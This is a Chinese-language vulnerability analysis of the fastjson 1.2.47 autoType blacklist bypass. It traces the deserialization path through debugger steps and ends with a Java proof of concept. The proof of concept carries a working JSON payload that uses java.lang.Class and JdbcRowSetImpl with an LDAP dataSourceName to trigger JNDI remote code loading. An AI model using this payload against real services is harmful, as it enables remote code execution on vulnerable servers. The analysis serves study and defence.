.. _1.2.47:

版本1.2.47
================

漏洞说明
----------

补充了多个类型的hash黑名单，包括myBatis中的JndiDataSourceFactory类型，所以 :ref:`1.2.45` 中的POC不能用了。
通过构造json字符串，配置@type的值为java.lang.Class(即fastjson可以通过反序列化生成的类型)，将相应的val设置为com.sun.rowset.JdbcRowSetImpl(可远程执行的类型，正常情况下不能通过fastjson反序列化生成的类型)，绕过类型检查，将val设置的类型存入fastjson的mapping结构中。此时fastjson可支持JdbcRowSetImpl类型的反序列化，在构造的json字符串中，同时再配置该类型的远程调用语句。这样，可实现反序列化的远程调用。

fastjson在针对类进行反序列化时，会调用该类的setter方法。

可以触发远程调用指定的攻击类，在攻击类中设置fastjson进行反序列化时可执行的命令(即payload)

调试
------

.. figure:: images/1.2.47/main1-1.png
   
   Main.java 

   通过在fastjson.JSON.parseObject设置断点进行分步调试。

.. figure:: images/1.2.47/json1-1.png
   
   JSON.parseObject

   进入JSON.class的parseObject函数

.. figure:: images/1.2.47/json2-1.png

   JSON.parse1

.. figure:: images/1.2.47/json3-1.png

   JSON.parse2

.. figure:: images/1.2.47/json4-1.png

   JSON.parse3

   DefaultJSONParser构造函数对输入的json字符串进行解析、标记和词法分析

.. figure:: images/1.2.47/json4-2.png

   parse变量

   变量parser是一个DefaultJSONParser对象，包含对输入json字符串的分析信息。

.. figure:: images/1.2.47/defaultjsonparser1-1.png

   DefaultJSONParser.parse

   进入DefaultJSONParser.class的parse函数，这里的this指针，指向的是一个DefaultJSONParser对象，也就是前面的parser变量。

.. figure:: images/1.2.47/defaultjsonparser2-2.png

   DefaultJSONParser.parse1

   在单参数parse方法，根据parser结构中的lexer.token=12，跳转到相应的分支

.. figure:: images/1.2.47/defaultjsonparser3-2.png

   DefaultJSONParser.parseObject2

   key是a，进入parseObject函数的嵌套调用中

.. figure:: images/1.2.47/defaultjsonparser3-3.png

   DefaultJSONParser.parseObject2 

   重新解析出key为@type

.. figure:: images/1.2.47/json5-1.png

   JSON.DEFAULT_TYPE_KEY
   
   JSON.class中的DEFAUT_TYPE_KEY定义

.. figure:: images/1.2.47/defaultjsonparser3-4.png

   DefaultJSONParser.parseObject2

   进入key==JSON.DEFAULT_TYPE_KEY的分支，JSON.DEFAULT_TYPE_KEY的值为@type，同时解析出typeName为输入的json字符串中的class.lang.Class。293行的意思是生成当前对象的属性标志位有没有(isEnable)忽略自定义类型(Feature.IgnoreAutoType)的特性，默认没有，isEnable返回否，再加反转符号!，则该判断条件为真，即支持自定义类型则进入分支内。
   
   object是一个空的JSONObject对象，没有对应的类，所以要通过checkAutoType函数进行检测。

.. figure:: images/1.2.47/parserconfig1-1.png

   ParserConfig.checkAutoType 

   进入ParserConfig.class的checkAutoType函数，检查是否支持输入的自定义类型，为了提高转换效率，fastjson内置了部分类型。通过计算h1排除以“[”开头的类型名称。运行到808行，autoTypeSupport为false默认不支持自定义类型，跳过该分支。

.. figure:: images/1.2.47/parserconfig1-2.png

   ParserConfig.checkAutoType

   从mapping结构中匹配预定义的类型，对于java.lang.Class这个类名没有在mapping中定义，返回null。

.. figure:: images/1.2.47/typeutils1-1.png

   TypeUtils.getClassFromMapping

.. figure:: images/1.2.47/typeutils1-2.png

   mapping变量 
   
   mapping中预置部分类型

.. figure:: images/1.2.47/parserconfig1-3.png

   ParserConfig.checkAutoType

   在deserializers中也预存了部分类型名称的对应关系，它的值在initDeserializers函数中定义，java.lang.Class有对应关系。获取到类型后返回DefaultJSONParser类中。

.. figure:: images/1.2.47/parserconfig2-1.png

   ParserConfig.initDeserializers

.. figure:: images/1.2.47/parserconfig2-2.png

   ParserConfig.initDeserializers

   deserializers中预存了对应的类，包含java.lang.Class

.. _defaultJSONParser:

.. figure:: images/1.2.47/defaultjsonparser3-5.png

   DefaultJSONParser.parseObject

   返回DefaultJSONParser的parseObject函数，运行到323行，对类型进行反序列化。


.. figure:: images/1.2.47/misccodec1-1.png

   MiscCodec.deserialze 
   
   进入MiscCodec.class，解析出json字符串的val值com.sun.rowset.JdbcRowSetImpl


.. figure:: images/1.2.47/misccodec1-2.png

   MiscCodec.deserialze 

   将objVal的值赋给strVal


.. figure:: images/1.2.47/misccodec1-3.png

   MiscCodec.deserialze

   调用两个参数的loadClass函数

.. figure:: images/1.2.47/typeutils2-1.png

   TypeUtils.loadClass2

.. figure:: images/1.2.47/typeutils3-1.png

   TypeUtils.loadClass3


.. figure:: images/1.2.47/typeutils3-2.png

   TypeUtils.loadClass3

   在1137行调用一个参数的loadClass函数

.. figure:: images/1.2.47/typeutils4-1.png

   TypeUtils.loadClass1

   从调用一个参数的loadClass函数返回调用两个参数的loadClass函数

.. figure:: images/1.2.47/typeutils3-3.png

   TypeUtils.loadClass3

   通过两个参数的loadClass再进入三个参数的loadClass函数内部，由于classLoader为空，本次运行到1153行，将输入的JdbcRowSetImpl类保存到mapping中

.. figure:: images/1.2.47/defaultjsonparser3-5.png

   DefaultJSONParser.parseObject

   返回到DefaultJSONParser.class的parseObject函数中，obj的值为com.sun.rowset.JdbcRowSetImpl，同图 :ref:`defaultJSONParser`

.. figure:: images/1.2.47/defaultjsonparser3-7.png

   DefaultJSONParser.parseObject

   进入parseObject函数嵌套循环

.. figure:: images/1.2.47/defaultjsonparser3-8.png

   DefaultJSONParser.parseObject

   调用checkAutoType做类型检查


.. figure:: images/1.2.47/parserconfig3-1.png

   ParserConfig.checkAutoType

   此时的typeName是com.sun.rowset.JdbcRowSetImpl，对该类型进行检查


.. figure:: images/1.2.47/parserconfig3-2.png

   ParserConfig.checkAutoType

   由于该类型在前面a字段的解析时已经保存到mapping中，所以调用getClassFromMapping函数时会获取对应的类型，返回的clazz即为JdbcRowSetImpl，可以直接返回到DefaultJSONObject对象中，从而绕过黑名单。

.. figure:: images/1.2.47/fastjson1.2.47.png
   :scale: 100%
   :width: 800 px
   :height: 400 px

   调用序列图


POC
-----

.. code-block:: java

   package org.example;
   
   import com.alibaba.fastjson.JSON;
   
   public class Main {
       public static void main(String[] args) throws ClassNotFoundException {
           /*
           {
               "a": {
                   "@type": "java.lang.Class",
                   "val": "com.sun.rowset.JdbcRowSetImpl"
               },
               "b": {
                   "@type": "com.sun.rowset.JdbcRowSetImpl",
                   "dataSourceName": "ldap://localhost:1389/ExecTest",
                   "autoCommit": true
               }
           }
   
            */
           String s = "{\"a\": {\"@type\": \"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}, \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/ExecTest\", \"autoCommit\":true}}";
           Object contentValue = JSON.parseObject(s);
       }
   }
